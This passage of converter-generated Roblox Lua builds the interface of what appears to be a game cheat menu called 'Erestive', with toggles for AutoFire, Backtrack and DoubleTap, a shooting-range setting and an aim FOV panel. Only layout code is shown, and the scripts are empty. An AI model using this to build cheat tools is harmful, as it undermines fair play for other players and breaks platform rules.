G2L["364"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Animations
G2L["365"] = Instance.new("LocalScript", G2L["364"]);
G2L["365"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Animations.Sample
G2L["366"] = Instance.new("ImageLabel", G2L["365"]);
G2L["366"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["366"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["366"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["366"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["366"]["BackgroundTransparency"] = 1;
G2L["366"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.UICorner
G2L["367"] = Instance.new("UICorner", G2L["364"]);
G2L["367"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.UIGradient
G2L["368"] = Instance.new("UIGradient", G2L["364"]);
G2L["368"]["Rotation"] = -90;
G2L["368"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Button
G2L["369"] = Instance.new("TextButton", G2L["364"]);
G2L["369"]["TextTransparency"] = 1;
G2L["369"]["TextSize"] = 14;
G2L["369"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["369"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["369"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["369"]["ZIndex"] = 2;
G2L["369"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["369"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["369"]["Text"] = [[ ]];
G2L["369"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Button.LocalScript
G2L["36a"] = Instance.new("LocalScript", G2L["369"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Button.UICorner
G2L["36b"] = Instance.new("UICorner", G2L["369"]);
G2L["36b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.OnOrOff
G2L["36c"] = Instance.new("TextLabel", G2L["361"]);
G2L["36c"]["TextWrapped"] = true;
G2L["36c"]["ZIndex"] = 2;
G2L["36c"]["TextSize"] = 14;
G2L["36c"]["TextScaled"] = true;
G2L["36c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36c"]["BackgroundTransparency"] = 1;
G2L["36c"]["Size"] = UDim2.new(0.35271, 0, 0.5158, 0);
G2L["36c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["36c"]["Text"] = [[DoubleTap]];
G2L["36c"]["Name"] = [[OnOrOff]];
G2L["36c"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.UICorner
G2L["36d"] = Instance.new("UICorner", G2L["361"]);
G2L["36d"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.UIGradient
G2L["36e"] = Instance.new("UIGradient", G2L["361"]);
G2L["36e"]["Rotation"] = -90;
G2L["36e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.ImageLabel
G2L["36f"] = Instance.new("ImageLabel", G2L["361"]);
G2L["36f"]["BorderSizePixel"] = 0;
G2L["36f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["36f"]["Image"] = [[rbxassetid://15000720478]];
G2L["36f"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["36f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36f"]["BackgroundTransparency"] = 1;
G2L["36f"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.UIStroke
G2L["370"] = Instance.new("UIStroke", G2L["361"]);
G2L["370"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack
G2L["371"] = Instance.new("Frame", G2L["2ec"]);
G2L["371"]["BorderSizePixel"] = 0;
G2L["371"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["371"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["371"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["371"]["Name"] = [[Backtrack]];
G2L["371"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider
G2L["372"] = Instance.new("Frame", G2L["371"]);
G2L["372"]["BorderSizePixel"] = 0;
G2L["372"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["372"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["372"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["372"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Animations
G2L["373"] = Instance.new("LocalScript", G2L["372"]);
G2L["373"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Animations.Sample
G2L["374"] = Instance.new("ImageLabel", G2L["373"]);
G2L["374"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["374"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["374"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["374"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["374"]["BackgroundTransparency"] = 1;
G2L["374"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.UICorner
G2L["375"] = Instance.new("UICorner", G2L["372"]);
G2L["375"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.UIGradient
G2L["376"] = Instance.new("UIGradient", G2L["372"]);
G2L["376"]["Rotation"] = -90;
G2L["376"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Button
G2L["377"] = Instance.new("TextButton", G2L["372"]);
G2L["377"]["TextTransparency"] = 1;
G2L["377"]["TextSize"] = 14;
G2L["377"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["377"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["377"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["377"]["ZIndex"] = 2;
G2L["377"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["377"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["377"]["Text"] = [[ ]];
G2L["377"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Button.server
G2L["378"] = Instance.new("LocalScript", G2L["377"]);
G2L["378"]["Name"] = [[server]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.Slider.Button.UICorner
G2L["379"] = Instance.new("UICorner", G2L["377"]);
G2L["379"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.OnOrOff
G2L["37a"] = Instance.new("TextLabel", G2L["371"]);
G2L["37a"]["TextWrapped"] = true;
G2L["37a"]["ZIndex"] = 2;
G2L["37a"]["TextSize"] = 14;
G2L["37a"]["TextScaled"] = true;
G2L["37a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37a"]["BackgroundTransparency"] = 1;
G2L["37a"]["Size"] = UDim2.new(0.68443, 0, 0.5158, 0);
G2L["37a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["37a"]["Text"] = [[Backtrack]];
G2L["37a"]["Name"] = [[OnOrOff]];
G2L["37a"]["Position"] = UDim2.new(0.07602, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.UICorner
G2L["37b"] = Instance.new("UICorner", G2L["371"]);
G2L["37b"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.UIGradient
G2L["37c"] = Instance.new("UIGradient", G2L["371"]);
G2L["37c"]["Rotation"] = -90;
G2L["37c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Backtrack.UIStroke
G2L["37d"] = Instance.new("UIStroke", G2L["371"]);
G2L["37d"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire
G2L["37e"] = Instance.new("Frame", G2L["2ec"]);
G2L["37e"]["BorderSizePixel"] = 0;
G2L["37e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["37e"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["37e"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["37e"]["Name"] = [[AutoFire]];
G2L["37e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider
G2L["37f"] = Instance.new("Frame", G2L["37e"]);
G2L["37f"]["BorderSizePixel"] = 0;
G2L["37f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["37f"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["37f"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["37f"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Animations
G2L["380"] = Instance.new("LocalScript", G2L["37f"]);
G2L["380"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Animations.Sample
G2L["381"] = Instance.new("ImageLabel", G2L["380"]);
G2L["381"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["381"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["381"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["381"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["381"]["BackgroundTransparency"] = 1;
G2L["381"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.UICorner
G2L["382"] = Instance.new("UICorner", G2L["37f"]);
G2L["382"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.UIGradient
G2L["383"] = Instance.new("UIGradient", G2L["37f"]);
G2L["383"]["Rotation"] = -90;
G2L["383"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button
G2L["384"] = Instance.new("TextButton", G2L["37f"]);
G2L["384"]["TextTransparency"] = 1;
G2L["384"]["TextSize"] = 14;
G2L["384"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["384"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["384"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["384"]["ZIndex"] = 2;
G2L["384"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["384"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["384"]["Text"] = [[ ]];
G2L["384"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.server
G2L["385"] = Instance.new("LocalScript", G2L["384"]);
G2L["385"]["Name"] = [[server]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.UICorner
G2L["386"] = Instance.new("UICorner", G2L["384"]);
G2L["386"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.Value
G2L["387"] = Instance.new("BoolValue", G2L["384"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.cooldown
G2L["388"] = Instance.new("BoolValue", G2L["384"]);
G2L["388"]["Name"] = [[cooldown]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.shootingRange
G2L["389"] = Instance.new("NumberValue", G2L["384"]);
G2L["389"]["Name"] = [[shootingRange]];
G2L["389"]["Value"] = 50;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.TargetPart
G2L["38a"] = Instance.new("StringValue", G2L["384"]);
G2L["38a"]["Name"] = [[TargetPart]];
G2L["38a"]["Value"] = [[All]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider.Button.FireMode
G2L["38b"] = Instance.new("StringValue", G2L["384"]);
G2L["38b"]["Name"] = [[FireMode]];
G2L["38b"]["Value"] = [[Click]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.OnOrOff
G2L["38c"] = Instance.new("TextLabel", G2L["37e"]);
G2L["38c"]["TextWrapped"] = true;
G2L["38c"]["ZIndex"] = 2;
G2L["38c"]["TextSize"] = 14;
G2L["38c"]["TextScaled"] = true;
G2L["38c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38c"]["BackgroundTransparency"] = 1;
G2L["38c"]["Size"] = UDim2.new(0.47753, 0, 0.5158, 0);
G2L["38c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["38c"]["Text"] = [[AutoFire]];
G2L["38c"]["Name"] = [[OnOrOff]];
G2L["38c"]["Position"] = UDim2.new(0.07602, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.UICorner
G2L["38d"] = Instance.new("UICorner", G2L["37e"]);
G2L["38d"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.UIGradient
G2L["38e"] = Instance.new("UIGradient", G2L["37e"]);
G2L["38e"]["Rotation"] = -90;
G2L["38e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.UIStroke
G2L["38f"] = Instance.new("UIStroke", G2L["37e"]);
G2L["38f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2
G2L["390"] = Instance.new("Frame", G2L["37e"]);
G2L["390"]["BorderSizePixel"] = 0;
G2L["390"]["BackgroundColor3"] = Color3.fromRGB(3, 31, 0);
G2L["390"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["390"]["Position"] = UDim2.new(0.60655, 0, 0.11724, 0);
G2L["390"]["Name"] = [[Slider2]];
G2L["390"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Animations
G2L["391"] = Instance.new("LocalScript", G2L["390"]);
G2L["391"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Animations.Sample
G2L["392"] = Instance.new("ImageLabel", G2L["391"]);
G2L["392"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["392"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["392"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["392"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["392"]["BackgroundTransparency"] = 1;
G2L["392"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.UICorner
G2L["393"] = Instance.new("UICorner", G2L["390"]);
G2L["393"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.UIGradient
G2L["394"] = Instance.new("UIGradient", G2L["390"]);
G2L["394"]["Rotation"] = -90;
G2L["394"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Button
G2L["395"] = Instance.new("TextButton", G2L["390"]);
G2L["395"]["TextTransparency"] = 1;
G2L["395"]["TextSize"] = 14;
G2L["395"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["395"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["395"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["395"]["ZIndex"] = 2;
G2L["395"]["BackgroundTransparency"] = 1;
G2L["395"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["395"]["Text"] = [[ ]];
G2L["395"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Button.UICorner
G2L["396"] = Instance.new("UICorner", G2L["395"]);
G2L["396"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Button.ImageLabel
G2L["397"] = Instance.new("ImageLabel", G2L["395"]);
G2L["397"]["BorderSizePixel"] = 0;
G2L["397"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["397"]["Image"] = [[rbxassetid://7059346373]];
G2L["397"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["397"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["397"]["BackgroundTransparency"] = 1;
G2L["397"]["Position"] = UDim2.new(-0.08424, 0, 0.0684, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Button.LocalScript
G2L["398"] = Instance.new("LocalScript", G2L["395"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame
G2L["399"] = Instance.new("Frame", G2L["390"]);
G2L["399"]["Visible"] = false;
G2L["399"]["ZIndex"] = 66;
G2L["399"]["BorderSizePixel"] = 0;
G2L["399"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
G2L["399"]["Size"] = UDim2.new(19.44731, 0, 10.96031, 0);
G2L["399"]["Position"] = UDim2.new(-3.74676, 0, 1.53898, 0);
G2L["399"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.UICorner
G2L["39a"] = Instance.new("UICorner", G2L["399"]);
G2L["39a"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.UIGradient
G2L["39b"] = Instance.new("UIGradient", G2L["399"]);
G2L["39b"]["Rotation"] = -90;
G2L["39b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.UIGridLayout
G2L["39c"] = Instance.new("UIGridLayout", G2L["399"]);
G2L["39c"]["CellSize"] = UDim2.new(0, 145, 0, 40);
G2L["39c"]["CellPadding"] = UDim2.new(0, 9, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton
G2L["39d"] = Instance.new("TextButton", G2L["399"]);
G2L["39d"]["TextWrapped"] = true;
G2L["39d"]["BorderSizePixel"] = 0;
G2L["39d"]["TextSize"] = 14;
G2L["39d"]["TextScaled"] = true;
G2L["39d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["39d"]["BackgroundTransparency"] = 1;
G2L["39d"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["39d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39d"]["Text"] = [[shootingRange submit]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
G2L["39e"] = Instance.new("LocalScript", G2L["39d"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextBox
G2L["39f"] = Instance.new("TextBox", G2L["399"]);
G2L["39f"]["BorderSizePixel"] = 0;
G2L["39f"]["TextWrapped"] = true;
G2L["39f"]["TextSize"] = 14;
G2L["39f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39f"]["TextScaled"] = true;
G2L["39f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39f"]["PlaceholderText"] = [[shootingRange]];
G2L["39f"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["39f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39f"]["Text"] = [[50]];
G2L["39f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton
G2L["3a0"] = Instance.new("TextButton", G2L["399"]);
G2L["3a0"]["TextWrapped"] = true;
G2L["3a0"]["BorderSizePixel"] = 0;
G2L["3a0"]["TextSize"] = 14;
G2L["3a0"]["TextScaled"] = true;
G2L["3a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3a0"]["BackgroundTransparency"] = 1;
G2L["3a0"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["3a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a0"]["Text"] = [[cooldown - OFF]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
G2L["3a1"] = Instance.new("LocalScript", G2L["3a0"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton
G2L["3a2"] = Instance.new("TextButton", G2L["399"]);
G2L["3a2"]["TextWrapped"] = true;
G2L["3a2"]["BorderSizePixel"] = 0;
G2L["3a2"]["TextSize"] = 14;
G2L["3a2"]["TextScaled"] = true;
G2L["3a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3a2"]["BackgroundTransparency"] = 1;
G2L["3a2"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["3a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a2"]["Text"] = [[Mode: Click]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.AutoFire.Slider2.Frame.TextButton.LocalScript
G2L["3a3"] = Instance.new("LocalScript", G2L["3a2"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4
G2L["3a4"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["3a4"]["Visible"] = false;
G2L["3a4"]["Active"] = true;
G2L["3a4"]["ZIndex"] = 3;
G2L["3a4"]["BorderSizePixel"] = 0;
G2L["3a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a4"]["Name"] = [[Frame4]];
G2L["3a4"]["ScrollBarImageTransparency"] = 1;
G2L["3a4"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["3a4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3a4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a4"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["3a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a4"]["ScrollBarThickness"] = 0;
G2L["3a4"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.UIPadding
G2L["3a5"] = Instance.new("UIPadding", G2L["3a4"]);
G2L["3a5"]["PaddingTop"] = UDim.new(0, 5);
G2L["3a5"]["PaddingRight"] = UDim.new(0, 5);
G2L["3a5"]["PaddingLeft"] = UDim.new(0, 5);
G2L["3a5"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.UIGridLayout
G2L["3a6"] = Instance.new("UIGridLayout", G2L["3a4"]);
G2L["3a6"]["CellSize"] = UDim2.new(0, 170, 0, 40);
G2L["3a6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["3a6"]["CellPadding"] = UDim2.new(0, 15, 0, 25);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim
G2L["3a7"] = Instance.new("Frame", G2L["3a4"]);
G2L["3a7"]["BorderSizePixel"] = 0;
G2L["3a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a7"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3a7"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a7"]["Name"] = [[Aim]];
G2L["3a7"]["LayoutOrder"] = 2;
G2L["3a7"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.UIListLayout
G2L["3a8"] = Instance.new("UIListLayout", G2L["3a7"]);
G2L["3a8"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV
G2L["3a9"] = Instance.new("Frame", G2L["3a7"]);
G2L["3a9"]["BorderSizePixel"] = 0;
G2L["3a9"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3a9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3a9"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3a9"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.WhiteBar
G2L["3aa"] = Instance.new("Frame", G2L["3a9"]);
G2L["3aa"]["BorderSizePixel"] = 0;
G2L["3aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3aa"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3aa"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3aa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3aa"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.Aim.FOV.WhiteBar.UIGradient
G2L["3ab"] = Instance.new("UIGradient", G2L["3aa"]);
